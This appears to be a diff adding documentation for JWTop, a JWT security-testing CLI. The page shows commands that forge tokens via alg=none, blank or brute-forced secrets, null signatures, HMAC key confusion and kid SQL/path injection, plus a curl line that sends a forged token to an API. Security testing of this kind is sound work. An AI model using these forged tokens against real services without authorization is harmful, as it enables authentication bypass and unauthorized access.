@@ -1,0 +1,113 @@
+---
+title: Test JWT security
+description: Probe a server for common JWT vulnerabilities and generate exploit tokens for manual testing.
+---
+
+# Test JWT security
+
+JWTop provides two complementary tools for JWT security testing: `jwtop crack` probes a live server automatically, while `jwtop exploit` generates modified tokens for manual inspection or targeted tests.
+
+> Use these tools only against systems you own or have explicit written permission to test.
+
+## Automated server scan
+
+`jwtop crack` sends a probe for each known exploit technique and reports which ones the server accepts.
+
+```sh
+jwtop crack $TOKEN --url https://api.example.com/protected
+```
+
+Sample output:
+
+```
+[+] algnone (none)              200  VULNERABLE
+[ ] algnone (NONE)              401
+[ ] algnone (None)              401
+[ ] algnone (nOnE)              401
+[ ] blanksecret                 401
+[ ] nullsig                     401
+[-] hmacconfusion               skipped (no public key provided)
+[ ] kidinjection (sql)          401
+[ ] kidinjection (path)         401
+[-] secret                      skipped (not found in dictionary)
+```
+
+A `[+]` line means the server accepted the exploit. Exit code `0` means at least one exploit succeeded; `1` means none did.
+
+**Include a public key to enable the hmacconfusion probe:**
+
+```sh
+jwtop crack $TOKEN --url https://api.example.com/protected \
+  --key /path/to/public.pem
+```
+
+**Add a custom secret wordlist:**
+
+```sh
+jwtop crack $TOKEN --url https://api.example.com/protected \
+  --wordlist /path/to/secrets.txt
+```
+
+## Manual exploit tokens
+
+Use `jwtop exploit` when you need a specific modified token for a targeted test, a report, or a case where the server requires a non-standard request format.
+
+**alg=none bypass:**
+
+```sh
+# Single variant
+jwtop exploit algnone $TOKEN
+
+# All four capitalisation variants (one per line)
+jwtop exploit algnone --all $TOKEN
+```
+
+**Blank HMAC secret:**
+
+```sh
+jwtop exploit blanksecret $TOKEN
+```
+
+**Null signature (alg unchanged):**
+
+```sh
+jwtop exploit nullsig $TOKEN
+```
+
+**HMAC confusion (public key as secret):**
+
+```sh
+jwtop exploit hmacconfusion $TOKEN --key /path/to/public.pem
+```
+
+**kid header injection:**
+
+```sh
+# SQL injection variant
+jwtop exploit kidinjection --mode sql $TOKEN
+
+# Path traversal variant
+jwtop exploit kidinjection --mode path $TOKEN
+```
+
+**Brute-force HMAC secret:**
+
+```sh
+jwtop exploit weaksecret $TOKEN
+jwtop exploit weaksecret $TOKEN --wordlist /path/to/secrets.txt
+```
+
+## Using exploit tokens in scripts
+
+Capture the output and send it as a Bearer token:
+
+```sh
+EXPLOITED=$(jwtop exploit algnone $TOKEN)
+curl -si -H "Authorization: Bearer $EXPLOITED" https://api.example.com/protected \
+  | head -1
+```
+
+## See also
+
+- [`crack` reference](../cli/crack)
+- [`exploit` reference](../cli/exploit)
